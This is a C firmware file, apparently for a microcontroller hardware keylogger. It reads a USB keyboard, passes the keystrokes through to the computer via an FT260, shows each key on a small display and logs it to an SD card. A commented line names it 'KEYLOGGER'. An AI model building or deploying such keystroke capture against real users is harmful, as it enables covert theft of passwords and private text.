#include "include/hardware/gpio.h"
#include "include/hardware/sio.h"
#include "include/runtime/runtime.h"
#include "include/hardware/uart.h"
#include "include/hardware/spi.h"
#include "include/hardware/i2c.h"
#include "include/drivers/ssd1306.h"
#include "include/hardware/timer.h"
#include "include/hardware/usb.h"
#include "include/drivers/usb_host_hid.h"
#include "include/drivers/usb_hid.h"
#include "include/events/events.h"
#include "include/drivers/sd_spi.h"
#include "include/storage/storage.h"
#include "include/lib/graphics/graphics.h"
#include "include/drivers/ft260.h"

#define LED 25
bool print = false;

void toggle(void) {
    print = true;
}

int main()
{
    runtime_init(); // TODO: Call runtime_init() from crt0.s before main ?

	gpio_enable();

    event_init_queue();

	// SIO
    gpio_set_function(25, GPIO_FUNC_SIO);
    sio_init(LED);

    // UART
    uart_init(uart0_hw,9600);
   // gpio_set_function(1,GPIO_FUNC_UART);
    gpio_set_function(0,GPIO_FUNC_UART);
    uint8_t test[5] = {0,1,2,3,4};

    // SPI
//    spi_init(spi0_hw,50000);
//    gpio_set_function(2,GPIO_FUNC_SPI);
//    gpio_set_function(3,GPIO_FUNC_SPI);
//    gpio_set_function(4,GPIO_FUNC_SPI);

    // FT260
    ft260_t ft260;
    ft260_init(&ft260, i2c0_hw, 8, 9, 15);

    // I2C
    i2c_init(i2c1_hw, 100000);
    gpio_set_function(6, GPIO_FUNC_I2C);
    gpio_set_function(7, GPIO_FUNC_I2C);

    // SSD1306 display
    uint8_t buffer[512];
    ssd1306_t ssd1306 = ssd1306_init(i2c1_hw, 0x3C, 128,32, buffer);

    // Graphics
    graphics_display_t display = graphics_init(&ssd1306);

    // USB host controller
    usb_init();

    // Sd card detect pin
    gpio_set_function(1, GPIO_FUNC_SIO);
    gpio_set_pulldown(1, false);
    gpio_set_pullup(1,true);
    sio_init(1);
    sio_set_dir(1,INPUT);

    // Buttons
    // Button 1
    gpio_set_function(2, GPIO_FUNC_SIO);
    gpio_set_pulldown(2, false);
    gpio_set_pullup(2,true);
    sio_init(2);
    sio_set_dir(2,INPUT);
    gpio_set_irq_enabled(2,gpio_irq_event_edge_low, toggle);
    // Button2
    gpio_set_function(14, GPIO_FUNC_SIO);
    gpio_set_pulldown(14, false);
    gpio_set_pullup(14,true);
    sio_init(14);
    sio_set_dir(14,INPUT);
    gpio_set_irq_enabled(14,gpio_irq_event_edge_low, toggle);

    bool sd_init = false;
    uint8_t sd_buff[600];

    sd_spi_t sd;
    storage_t storage;
    uint8_t temp[600] = "D:t is een test 1234 you frequently cannot address a 32-bit word that is not aligned to a 4-byte boundary (as your error is telling you). On x86 you can access non-aligned data, however there is a huge hit on performance. Where an ARM part does support unaligned accesses (e.g. single word normal load), there is a performance penalty and there should be a configurable exception trap. To solve your problem, you would need to request a block of memory that is 4-byte aligned and copy the non-aligned bytes + fill it with garbage bytes to ensure it is 4 byte-aligned";

    int lc = 0;
//    graphics_print_text(&display, "KEYLOGGER\nDisplay test");
//    graphics_draw_horizontal_line(&display, (coordinate_t){0,20}, 128);

    // HID
    usb_hid_keyboard_report_parser_t hid_parser = hid_report_parser_init();
    uint8_t pressed_keys[6];
    usb_hid_boot_keyboard_input_report_t hid_report;
    usb_hid_boot_keyboard_output_report_t output_report;

	while(1) {
//	    spi_write(spi0_hw, &test,5);
        //uart_puts(uart0_hw, "Dit is een test");
//	    uart_write(uart0_hw,&test,5);
	    //i2c_write(i2c0_hw, 0x3C, &test, 5, true, true);
        if (print) {
            print = false;
            graphics_print_char(&display, 'X');
        }
        event_task();
        graphics_task(&display);

        if (!sd_init && !sio_get(1)) {
            sd = sd_spi_init(spi0_hw, 17, 19, 20, 18);
            storage = storage_init(&sd, sd_buff, 600);
            sd_init = true;

//            for(int i = 0; i < 550; i++){
//                storage_store_byte(&storage, temp[i]);
//            }
        }else if(sd_init && !sio_get(1)) {
            storage_task(&storage);
        }

        while(!usb_host_hid_report_queue_is_empty()) {
            hid_report = usb_host_hid_report_dequeue();
            ft260_send_input_report(&ft260, &hid_report);
            int chars = hid_report_parse(&hid_parser, &hid_report, pressed_keys);
            for (int i = 0; i < chars; i++){
                graphics_print_char(&display, pressed_keys[i]);
                storage_store_byte(&storage, pressed_keys[i]);
            }
        }
        if (ft260_get_output_report(&ft260, &output_report)) {
           //usb_host_hid_send_output_report(&output_report);
        }

//		sio_put(LED,1);
//        wait_ms(100);   //delay(150);
//        sio_put(LED,0);
//        wait_ms(100);   //delay(150);
	}

	return 0;
}
